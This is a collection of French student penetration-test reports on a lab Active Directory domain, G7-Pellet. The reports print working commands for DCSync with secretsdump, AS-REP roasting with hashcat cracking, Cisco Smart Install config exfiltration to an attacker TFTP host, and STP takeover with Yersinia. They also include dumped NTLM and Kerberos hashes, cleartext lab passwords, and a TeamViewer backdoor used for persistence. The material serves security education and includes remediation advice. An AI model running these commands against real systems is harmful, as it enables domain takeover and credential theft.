# RAPPORT D'AUDIT - SAE CYBER

- **Auditeur :** Noa Mahier--Allili
- **Date :** 15 Janvier 2026
- **Cible :** Domaine G7-Pellet.com.test

---

## 1. Reconnaissance

**Objectif :** Cartographier l'infrastructure réseau et les services exposés.

### 1.1 Analyse Réseau (Couches 2 & 3)

L'analyse passive du trafic via Wireshark a permis d'identifier la topologie critique du réseau :

- **Spanning Tree (STP) :** Une trame indique un Root Bridge avec la priorité **32768** et l'adresse MAC 00:14:6a:42:a6:00.
- **Redondance (HSRP) :** Nous avons intercepté des échanges entre deux routeurs (L3) : 
  - 10.0.3.130 (État : **Active**) : Gère le trafic actuel.
  - 10.0.3.131 (État : **Standby**) : En attente de bascule.

**Conclusion :** Il existe une haute disponibilité au niveau de la passerelle par défaut.

![Analyse Wireshark](wireshark.png)

### 1.2 Identification du Contrôleur de Domaine

Un scan Nmap ciblé a permis d'identifier le serveur central de l'infrastructure via le port **SMB (445)**.

```bash
nmap -Pn -p 445 --script smb-os-discovery 10.0.2.20
```

### 1.3 Énumération Active Directory

Après identification du domaine, nous avons utilisé l'outil rpcclient pour énumérer l'annuaire.

**Utilisateurs et Descriptions :**
L'énumération des utilisateurs (querydispinfo) révèle une convention de nommage basée sur l'univers "Game of Thrones" ainsi que des rôles clés (PDG, DRH, Admin Système) et des comptes de service critiques. On note par exemple daenerys.targaryen (*PDG*) ou cersei.lannister (*DRH*).

![Enumération utilisateurs](infouser.png)

**Groupes du Domaine :**
L'énumération des groupes (enumdomgroups) montre des groupes organisationnels spécifiques comme GRP_VIP, GRP_Finance` ou GRP_IT.

![Groupes du domaine](groupes.png)

**Analyse des Privilèges :**
L'analyse du groupe critique **"Admins du domaine" (RID 512)** révèle qu'il contient l'Administrateur (*RID 0x1f4*) ainsi que deux autres comptes (*RID 0x654* et *0x662*), identifiés comme ned.stark et daenerys.targaryen. Cette configuration augmente inutilement la surface d'attaque.

![Privilèges Admin](rid.png)

### 1.4 Exploration des Partages Réseau (SMB)

L'exploration des dossiers partagés via smbclient a révélé l'existence d'un partage caché critique nommé **IronThrone$**.

![Liste partages SMB](smbclient.png)

L'accès à ce dossier nous a permis de lister des fichiers sensibles : scripts de backup (dragon_backup.ps1), configuration Web (tomcat-users.xml) et des notes internes.

![Contenu du partage](smb.png)

---

## 2. Identification des Vulnérabilités

**Objectif :** Lister les failles de sécurité détectées avant leur exploitation.

Nous avons identifié plusieurs vulnérabilités critiques mettant en péril l'intégrité du domaine :

| Sévérité | Vulnérabilité              | Description et Preuve                                                                                                                                                                                                                                         |
|:---------|:---------------------------|:--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **CRITIQUE** | **Accès Physique / Réseau**    | Accès à l'infrastructure complète possible simplement en se branchant à un port de switch (déduit des trames STP/HSRP visibles).                                                                                                                              |
| **CRITIQUE** | **Identifiants en clair**      | Découverte de mots de passe en clair dans des fichiers sur IronThrone$ :<br />• tomcat-users.xml : Admin Tomcat (admin/admin).<br />• mount_kingdoms.bat : Compte Tywin Lannister (Gold2024!).<br />• dragon_backup.ps1 : Service svc_dragon (FireAndBlood1). |
| **CRITIQUE** | **Politique de Mots de Passe** | Le compte Administrateur possède un mot de passe de seulement 6 caractères, vulnérable aux attaques par dictionnaire.                                                                                                                                         |
| **ÉLEVÉE**   | **Kerberoasting**              | Plusieurs comptes de service exposent un SPN, permettant l'extraction de tickets TGS pour cracking hors-ligne.                                                                                                                                                |
| **MOYENNE**  | **Information Leak (SMB)**     | Le port 445 divulgue la version précise de l'OS sans authentification.                                                                                                                                                                                        |
| **FAIBLE**   | **Service inutile (TFTP)**     | Le port 69 (UDP) est ouvert. Bien qu'inutilisé actuellement, ce protocole non sécurisé ne devrait pas être exposé.                                                                                                                                            |

**Preuve identifiants Tomcat :**![Preuve Tomcat](tomcat.png)

**Preuve mot de passe (Admin) :**![Preuve Admin](queryuser.png)

---

## 3. Exploitation

**Objectif :** Démontrer l'impact réel des vulnérabilités par une compromission contrôlée.

### 3.1 Brute-force Contextuel (Accès Initial)

Face à l'impossibilité d'utiliser l'attaque AS-REP Roasting, nous avons tenté une attaque par force brute ciblée sur le compte Administrateur. En utilisant un dictionnaire contextuel ("G7", "Pellet", "Admin"), nous avons trouvé le mot de passe en moins de 10 essais.

- **Compte compromis :** G7-PELLET\\Administrateur
- **Mot de passe découvert :** Admin1

L'analyse des fichiers du partage IronThrone$ a également révélé les mots de passe valides pour svc_dragon et tywin.lannister, offrant des vecteurs d'attaque alternatifs.

### 3.2 Compromission Totale du Domaine (DCSync)

Disposant désormais des privilèges "Domain Admin", nous avons exécuté une attaque DCSync via l'outil secretsdump.py. Cette technique simule le comportement d'un contrôleur de domaine légitime pour demander la réplication de la base de données des mots de passe (*NTDS.dit*).

```bash
python3 secretsdump.py G7-PELLET.com.test/administrateur:Admin1@10.0.2.20 -dc-ip 10.0.2.20
```

### 3.3 Preuve de compromission :

Nous avons récupéré les empreintes (hashs NTLM) de tous les utilisateurs critiques :

Administrateur:

```
500:aad3b435b51404eeaad3b435b51404ee:580b16d486d8d2cafa00b314d41fa396:::
```

krbtgt:

```
502:aad3b435b51404eeaad3b435b51404ee:434e47badc4fdd0a1d144b47ab71a58b:::
```

svc_dragon  :

```
svc_dragon:1677:aad3b435b51404eeaad3b435b51404ee:04ab56fccb064fbd461516dba0380504:::
```

**Impact** : Avec le hash du compte krbtgt, un attaquant peut créer un Golden Ticket, lui garantissant un accès administrateur persistant et indétectable sur toute l'infrastructure.

## 4. Remédiation

**Objectif :** Proposer des corrections pour sécuriser le système.

Pour corriger ces failles, les actions suivantes sont recommandées (par ordre de priorité) :

1. **Suppression des Identifiants en clair (Urgent) :**
   - Nettoyer les scripts (.bat, .ps1) et fichiers de configuration (.xml) sur les partages réseaux.
   - Effectuer une rotation immédiate des mots de passe exposés (Gold2024!, FireAndBlood1, admin).
2. **Renforcer la politique de mots de passe (GPO) :**
   - Imposer une longueur minimale de 12 caractères et activer la complexité.
   - Configurer le verrouillage de compte après 5 tentatives échouées.
3. **Sécuriser le compte krbtgt :**
   - Suite à la compromission DCSync, le mot de passe du compte krbtgt doit être changé **deux fois** consécutivement pour invalider tout Golden Ticket potentiel.
4. **Gestion des Comptes de Service :**
   - Migrer les comptes de service classiques vers des **gMSA** (Group Managed Service Accounts) pour automatiser la rotation des mots de passe et empêcher le Kerberoasting.

---

## 5. Découverte Critique (Post-Exploitation)

Lors de l'analyse du partage caché \\WIN-S3UCOQU2JJE\\IronThrone$, nous avons exfiltré un fichier nommé **SERVICES_VULNERABLES.txt**. Ce document technique interne agit comme un "récapitulatif d'installation" et liste explicitement les failles configurées sur l'infrastructure.

![Fichier SERVICES_VULNERABLES.txt](smb.png)

Ce document confirme l'existence de 5 chemins d'attaque majeurs que nous avons pu vérifier :

1. **Path 1 (SMB → SSH) :** Clés privées SSH stockées sur le partage, permettant une élévation vers les serveurs Linux.
2. **Path 2 (WebDAV) :** Upload de webshell possible via IIS WebDAV mal configuré (Everyone Full Control).
3. **Path 3 (Tomcat) :** Upload de WAR malveillant via l'interface Manager (comptes par défaut admin/admin).
4. **Path 4 (SQL) :** Base de données contenant des identifiants AD en clair.
5. **Path 5 (RDP) :** Bruteforce possible sur le port 3389 (Pas de NLA, mot de passe faible pour Daenerys).

Cette découverte prouve que le système n'est pas seulement mal configuré par erreur, mais contient des vulnérabilités structurelles documentées qui nécessitent une refonte complète de l'architecture de sécurité.

# Rapport de Test d'Intrusion

|                |              |
|----------------|--------------|
| **Auteur**         | leo sadoev   |
| **Date**           | 14/01/2026   |
| **Cible**          | Pellet.SA    |
| **Classification** | Confidentiel |

---

# Rapport d'Exploitation : Cisco Smart Install (SMI)

## 1. Résumé Exécutif

Lors de la phase d'audit du segment réseau, une vulnérabilité critique a été identifiée sur plusieurs équipements Cisco. Le protocole **Smart Install**, activé par défaut sur de nombreux commutateurs, a permis l'exfiltration à distance des fichiers de configuration complète (`running-config`). Ces fichiers contenaient des identifiants d'administration en clair, permettant un accès SSH total aux équipements.

## 2. Détails de la Vulnérabilité

* **Protocole :** Cisco Smart Install (SMI)
* **Port :** 4786/TCP
* **Description :** Ce protocole est conçu pour le déploiement automatisé de nouveaux équipements. Cependant, il ne dispose d'aucun mécanisme d'authentification par défaut. Un attaquant peut envoyer une commande malveillante au "Director" pour demander à l'équipement d'envoyer sa configuration vers un serveur TFTP contrôlé par l'attaquant.

## 3. Méthodologie d'Exploitation

L'attaque a été réalisée en trois étapes :

1. **Découverte :** Scan Nmap pour identifier le port TCP/4786 ouvert sur le réseau.
2. **Configuration du module :** Utilisation de Metasploit (`auxiliary/scanner/misc/cisco_smart_install`).
3. **Exfiltration :** Déclenchement de la copie du fichier `running-config` via le protocole vers la machine de l'attaquant agissant comme serveur TFTP.

### Preuve de Concept (PoC)

```text
[+] 10.0.0.2:4786 - Fingerprinted the Cisco Smart Install protocol
[*] 10.0.0.2:4786 - Attempting copy system:running-config tftp://10.0.0.15/IzVOfCnU
[+] 10.0.0.2:4786 - 10.0.0.2:4786 Username 'rootG7' with Password: Sae33!
```

## 4. Analyse de l'Impact

L'impact est **critique**. L'absence de hachage ou de chiffrement fort sur les mots de passe de la configuration a permis de récupérer :

* **Utilisateur :** `rootG7`
* **Mot de passe :** `Sae33!`

Avec ces informations, l'attaquant peut se connecter en SSH, modifier la topologie réseau, créer des VLANs pour isoler des machines, ou intercepter le trafic (Man-in-the-Middle).

---

## 5. Solutions et Remédiations

Pour protéger le réseau contre cette faille, voici les mesures à appliquer par ordre de priorité :

### A. Désactiver Smart Install (Solution recommandée)

Si vous n'utilisez pas la fonction de déploiement automatique, la meilleure sécurité reste de désactiver totalement le service sur tous les commutateurs Cisco.
**Commande Cisco IOS :**

```bash
conf t
no vstack
exit
wr
```

*Note : Sur les versions très anciennes, la commande peut être différente ou nécessiter une mise à jour d'IOS.*

### B. Bloquer le port via une ACL

Si le service ne peut pas être désactivé pour des raisons opérationnelles, limitez l'accès au port **4786** uniquement aux adresses IP de gestion autorisées.
**Commande Cisco IOS :**

```bash
ip access-list extended BLOCK_SMI
 deny tcp any any eq 4786
 permit ip any any
```

### C. Sécuriser les mots de passe dans la configuration

Le fait que le mot de passe apparaisse en clair est une erreur de configuration majeure.

1. **Chiffrement de base :** Activez le service de chiffrement des mots de passe (cela protège contre la lecture simple, bien que le Type 7 soit cassable facilement).

```bash
service password-encryption
```

1. **Hachage fort :** Utilisez `secret` au lieu de `password` pour le hachage en **Type 5 (MD5)** ou mieux, **Type 8/9 (SHA-256)**.

```bash
username rootG7 secret Sae33!
```

### D. Audit de sécurité régulier

Vérifiez régulièrement l'état du service avec la commande :

```bash
show vstack config
```

Si la ligne `Role: Client (Smart Install enabled)` apparaît, l'équipement est vulnérable.

---

Voici une proposition de restructuration pour votre rapport d'audit, organisée de manière professionnelle et méthodologique, en intégrant les informations clés extraites de vos tests.

---

# Rapport d'Audit Technique : Analyse du Service SMB

## 1. Résumé de l'Activité

L'objectif de cette phase était d'évaluer la sécurité du service de partage de fichiers (SMB) sur le segment réseau identifié. Les tests se sont concentrés sur la machine **10.0.2.20**, identifiée comme un contrôleur de domaine Windows.

## 2. Énumération et Découverte

### 2.1. Identification de la Cible

Un scan initial via Nmap sur la plage `10.0.0.0/16` a permis d'isoler l'hôte `10.0.2.20` présentant les ports critiques **139 (NetBIOS)** et **445 (SMB)** ouverts.

### 2.2. Énumération de bas niveau (enum4linux)

L'utilisation de l'outil `enum4linux` a permis d'extraire des informations structurelles essentielles malgré certaines restrictions d'accès.

**Informations critiques récupérées :**

* **Nom du Domaine (NetBIOS) :** `G7-PELLET` (utile pour les attaques Kerberos/LDAP ultérieures).
* **SID du Domaine :** `S-1-5-21-2915214770-3569230927-1395385459`. Cette valeur est fondamentale pour forger des tickets d'authentification malveillants (Golden Tickets) en cas de compromission ultérieure.
* **Sessions Nulles (Null Sessions) :** Le serveur autorise l'établissement de sessions anonymes (`username ''`, `password ''`). Bien que l'énumération des utilisateurs ait été bloquée (`NT_STATUS_ACCESS_DENIED`), la fuite du SID prouve une configuration initiale perfectible.

## 3. Analyse de Version et Vulnérabilités

### 3.1. Identification précise de l'OS

À l'aide du module Metasploit `auxiliary/scanner/smb/smb_version`, la version exacte du système a été déterminée :

* **Système d'exploitation :** Windows Server 2019 Standard (Build 17763).
* **Versions SMB supportées :** 1, 2 et 3.
* **Observation :** La présence de **SMBv1** sur un système moderne (2019) constitue une faiblesse, ce protocole étant obsolète et historiquement vulnérable.

### 3.2. Test de la vulnérabilité EternalBlue (MS17-010)

Conformément à la méthodologie d'audit, un test de vulnérabilité pour la faille **MS17-010** a été effectué via le module `auxiliary/scanner/smb/smb_ms17_010`.

**Résultat du test :**

> `[-] 10.0.2.20:445 - Host does NOT appear vulnerable.`

**Conclusion du test :** Bien que SMBv1 soit activé, le système a été correctement patché contre l'exploit EternalBlue. Aucune session de contrôle à distance (RCE) n'a pu être établie par ce vecteur.

---

## 4. Synthèse des Points Faibles

| Point Faible                  | Impact   | Recommandation                                                                    |
|-------------------------------|----------|-----------------------------------------------------------------------------------|
| **SMBv1 Activé**                  | Moyen    | Désactiver SMBv1 via PowerShell pour réduire la surface d'attaque.                |
| **Fuite du SID via Null Session** | Faible   | Restreindre davantage les accès anonymes aux services RPC/NetBIOS.                |
| **Signatures SMB Requises**       | Sécurisé | Point positif : La signature obligatoire prévient les attaques de type SMB Relay. |

---

*Rapport redige par : SADOEV Léo*

*Date : 15/01/2026*

# Rapport de Test d'Intrusion

|                |                       |
|----------------|-----------------------|
| **Auteur**         | Gavard-Gongallud Ryan |
| **Date**           | 15/01/2026            |
| **Classification** | Confidentiel          |

---

## 1. Resume Executif

### 1.1 Contexte

Ce rapport presente les resultats du test d'intrusion realise sur l'infrastructure cible dans le cadre de l'audit de SAE303.

### 1.2 Perimetre

- **Cible** : Maquette Groupe 7
- **Type de test** : Boite noire (aucune information prealable)

### 1.3 Synthese des resultats

|                               |   |
|-------------------------------|---|
| Nombre de services decouverts | X |
| Nombre de vulnerabilites      | 3 |

## 2. Methodologie

Ce test d'intrusion suit le standard **PTES** (Penetration Testing Execution Standard) :

1. **Reconnaissance** : Collecte d'informations sur la cible
2. **Scan et enumeration** : Identification des services et ports ouverts
3. **Analyse des vulnerabilites** : Recherche de failles de securite
4. **Exploitation** : Tentatives d'exploitation des vulnerabilites
5. **Post-exploitation** : Analyse des donnees accessibles
6. **Rapport** : Documentation des resultats

### 2.1 Outils utilises

- nmap - Scan de ports

---

## 3. Reconnaissance et Enumeration

### 3.1 Scan de ports

**Commande executee :**

Sur le port 15 du Switch 1

```bash
ip a
```

**Resultat :**

```
 eno1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 98:90:96:b4:92:04 brd ff:ff:ff:ff:ff:ff
    altname enp0s25
    inet 10.0.3.196/26 brd 10.0.3.255 scope global dynamic noprefixroute eno1
       valid_lft 86397sec preferred_lft 86397sec
    
```

```bash
nmap -sV 10.0.0.0/16
```

**Resultat :**

```
Nmap scan report for 10.0.3.195
Host is up (0.0014s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        Cisco SSH 1.25 (protocol 2.0)
23/tcp  open  telnet     Cisco router telnetd
80/tcp  open  http       Cisco IOS http config
443/tcp open  ssl/https?
Service Info: OS: IOS; Device: router; CPE: cpe:/o:cisco:ios

Nmap scan report for 10.0.3.196
Host is up (0.00042s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT    STATE SERVICE         VERSION
22/tcp  open  ssh             OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
902/tcp open  ssl/vmware-auth VMware Authentication Daemon 1.10 (Uses VNC, SOAP)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 3.2 Services decouverts

| Port | Protocole | Service | Version              |
|------|-----------|---------|----------------------|
| 22   | TCP       | ssh     | OpenSSH 9.2p1 Debian |
| 902  | TCP       | ssl     | Cisco router telnetd |

## 4. Analyse des Vulnerabilites

### 4.1 Vulnerabilite 1 : [RegreSSHion]

|                 |                          |
|-----------------|--------------------------|
| **Service affecte** | Port 22 / Open SSH 9.2p1 |
| **Severite**        | Haute (8.1)              |
| **CVSS**            | CVE-2024-6387            |

**Description :**

Cette exploit se base sur un race conditon, si à la fin du temps limite de l'authentification SSH l'attaquant arrive à envoyer des paquets ssh au moment où certaines fonction alors l'attaquant peut executer du code sans authentifier.

**Impact :**

Cette attaque permet à l'attaque d'executer du code à distance sans s'authentifier, il peut donc ainsi récupérer un accès root.

### 4.2 Vulnerabilite 2 : [\\0]

| **Service affecte** | Port 22 / Open SSH 9.2p1 |
| **Severite** | Moyenne (5.3)|
| **CVSS** | CVE-2025-61985 |

**Description :**

Cette exploit utilise le fait que avant la version 10.1 SSH n'arrive pas bien à traiter la suite de caractère "/0" l'URI ssh://.

**Impact :**

Cette attaque peut permette à un attaque d'executé du code sans authentification.

---

## 6. Recommandations de Remediation

| Vulnerabilite   | Priorite | Recommandation                          |
|-----------------|----------|-----------------------------------------|
| RegreSSHion     | Haute    | Mettre à jour la version de SSH utilisé |
| \\0              | Moyenne  | Mettre à jour la version de SSH utilisé |
| Vulnerabilite 2 | Moyenne  | Mettre à jour la version de SSH utilisé |

---

# Rapport de Pentest G7 - Phase 2 : Exploitation

# Rapport de Test d'Intrusion

|                |                 |
|----------------|-----------------|
| **Auteur**         | MARZOUGUE Rayan |
| **Date**           | 15/01/2026      |
| **Classification** | Confidentiel    |

## 1. Analyse et Exploitation Réseau (MSTP)

L'infrastructure est sur du **MSTP (Multiple Spanning Tree Protocol)**. On a utilisé **Yersinia**.

- **Action :** Lancement de Yersinia en mode interactif (`yersinia -I`).
- **Attaque :** On a envoyé des paquets pour devenir le **Regional Root** de la région MST.
- **Résultat :** Le switch a accepté nos BPDU sans broncher (pas de `BPDU Guard`).
- **Conséquence :** On a réussi à se placer au milieu du flux réseau. En gros, on peut intercepter tout ce qui passe entre les VLANs du groupe Pellet, surtout avec le protocole **SMBv1** qui est resté activé sur leur serveur.

---

## 2. Compromission de l'Active Directory (AD)

C'est ici qu'on a fait le plus de dégâts. L'idée était de remonter jusqu'au compte Administrateur pour avoor les fichiers du service Administratif.

- **Énumération :** Avec `Kerbrute`, j'ai confirmé que le compte `administrateur` existait bien sur le domaine `G7-Pellet.com.test`.
- **Le "Breakthrough" :** C'est **Noa** qui a trouvé le mot de passe du compte administrateur : `Admin1`. C'est un mot de passe trop faible qui ne respecte aucune règle de complexité ( sauf celle de M.Dien :) ).
- **Exploitation :** J'ai utilisé `nxc` (NetExec) pour valider l'accès.

  Bash

  ```
  nxc smb 10.0.2.20 -u 'administrateur' -p 'Admin1'
  ```

  Le terminal a renvoyé **Pwn3d!**, ce qui veut dire qu'on est **Domain Admin**.

---

## 3. Objectifs atteints & Post-Exploitation

Une fois admin du domaine, on a pu valider les deux points demandés :

1. **Vol de documents :** On peut entré dans le partage **"Documents Administratif"**. On a accès à tous les fichiers confidentiels.
2. **Persistance :** J'ai installé **TeamViewer** sur la machine pour être sûr de pouvoir revenir même si le mot de passe est changé. Ça nous permet d'avoir une "backdoor" facile.

---

## 4. Comment ils auraient pu nous bloquer ?

- **Côté Switch :** Configurer du `BPDU Guard` pour que le port se coupe dès que Yersinia essaie de parler.
- **Côté AD :** Forcer des mots de passe plus longs et compliqués. `Admin1`.
- **Côté Système :** Couper **SMBv1** et surveiller l'installation de logiciels comme TeamViewer sur le contrôleur de domaine.

---

##### **Annexes :**

![MitM.png](MitM.png)

![Capture d’écran_2026-01-14_15-19-05.png](Capture%20d%E2%80%99%C3%A9cran_2026-01-14_15-19-05.png)

# RAPPORT DE TEST D'INTRUSION

Auteur : KILINC Erhan Date : 15/01/2026 Cible : Infrastructure Pellet-SA

## 1. Résumé Exécutif

### 1.1 Contexte

Ce rapport présente les résultats du test d'intrusion réalisé sur l'infrastructure du client Pellet-SA dans le cadre de l'examen R316. L'objectif était d'identifier les vulnérabilités du réseau interne, spécifiquement sur la zone critique "Services Logiciels" (VLAN 700).

Machines Critiques :

```
10.0.2.20 : Contrôleur de Domaine (Windows Server 2019).
```

Type de test :kerbercing

### 1.3 Synthèse des résultats

L'audit a révélé un niveau de sécurité critique. Nous avons réussi à compromettre l'intégralité du domaine Windows en exploitant une faille de configuration sur le protocole Kerberos (AS-REP Roasting). Cela a permis d'obtenir les droits "Administrateur du Domaine" en moins de 30 minutes. Parallèlement, le serveur DNS a été compromis, offrant un point de pivot stable dans le réseau serveur.

## 2. Méthodologie

Ce test suit le standard PTES (Penetration Testing Execution Standard) :

```
Reconnaissance : Identification des machines et de la topologie via l'analyse des documents fournis et scans réseau.

Énumération : Cartographie des services (SMB, DNS, Kerberos) et des utilisateurs.

Analyse des vulnérabilités : Recherche de mauvaises configurations (AS-REP Roasting).

Exploitation : Intrusion active et élévation de privilèges.

Rapport : Documentation et recommandations.
```

- Outils utilisés : Nmap, Impacket (GetNPUsers), John the Ripper, Hydra, Rpcclient.

## 3. Reconnaissance et Énumération

#### 3.1 Scan de ports (Cartographie)

Depuis le VLAN 600 (Admin Info), nous avons scanné le réseau cible 10.0.2.0/25.

Commande exécutée : nmap -sV -p- 10.0.2.20

### 3.2 Informations collectées

```
Nom de domaine NetBIOS : G7-PELLET

Nom de domaine DNS : GX-Pellet.com.test
```

![alt text](nmap.png)
Le scan nmap sur la machine 10.0.2.20 a révélé les services suivants :

```
Ports ouverts : 88 (Kerberos)
```

## 5. Exploitation

### 5.1 Exploitation 1 : Compromission du Domaine (Kerberos)

### 5.1.1 Objectif

Récupérer le mot de passe du compte Administrateur pour prendre le contrôle du Contrôleur de Domaine.

### 5.1.2 Étapes d'exploitation

Étape 1 : Extraction du Hash (Roasting) Nous utilisons impacket pour demander le ticket sans mot de passe.

```
Commande :
Bash

impacket-GetNPUsers G7-Pellet.com.test/ -usersfile got_worldlist.txt -format hashcat -dc-ip 10.0.2.20

Résultat : Le serveur retourne le hash TGT. $krb5asrep$23$RENLY.BARATHEON@G7-PELLET.COM.TEST:d51790748291763574dcbd13c090c21d$e8f232fe91e8504c6014541d6542b23a134fb9efdd757c3af4d0844d19baa3f8211441dccb8c432b7a1a7e1ff9d5c0e1919a664873ef2313221e30fdaaeceb7a80dfc378d75f509724048f45bf55bc8f257283910bd46943410e8680a284cd01c022aac8b708a6c734fd98656fda5c75ebd6c6a0c21c4dc5df0e6a7ad953a9e0535403726e610e1ec7214844c42b788372331e2dc273456507392677c4d69e533c95fd451f6eef11ad66fed5d5c6a9acd81b1e71cc3d90674b1cf705591405e28aad6be6c5aef69ccf6cf6631a384dbd7b1fc63942c634da32bf0aaff6d991a8ea8fc86527ca7b096559506f7d2f48b4ce1f6e2e3907f967
```

Étape 2 : Cracking du mot de passe Nous utilisons hshcat avec une liste de mots de passe contextuelle.

```
Commande :  hashcat -m 18200 hash.txt /home/kali/Downloads/rockyou.txt

Résultat : Mot de passe trouvé : Rainbow123 .
```

### 5.1.3 Preuve

![alt text](mdp_trouver.png)![alt text](connexion_reussit-1.png)

## 6. Recommandations de Remédiation

Les actions correctives sont classées par priorité :
Priorité 1 : Actions Immédiates (Critique)

```
- Activer la pré-authentification Kerberos : Dans la console "Utilisateurs et ordinateurs Active Directory", pour chaque compte identifié (Renly, Bran, etc.) : Onglet Compte > Décocher la case "Ne pas demander la pré-authentification Kerberos".

- Changer les mots de passe compromis : Réinitialiser immédiatement le mot de passe de RENLY.BARATHEON et de tous les comptes dont le hash a été extrait.
```

Priorité 2 : Durcissement (Court terme)

```
Renforcer la politique de mots de passe : Le mot de passe Rainbow123 est trop faible. Imposer une longueur minimale de 12 caractères et une complexité (Majuscule, Minuscule, Chiffre, Caractère spécial).

Désactiver les Sessions Nulles : Restreindre l'accès anonyme aux partages et aux énumérations SAM via la clé de registre RestrictAnonymous.
```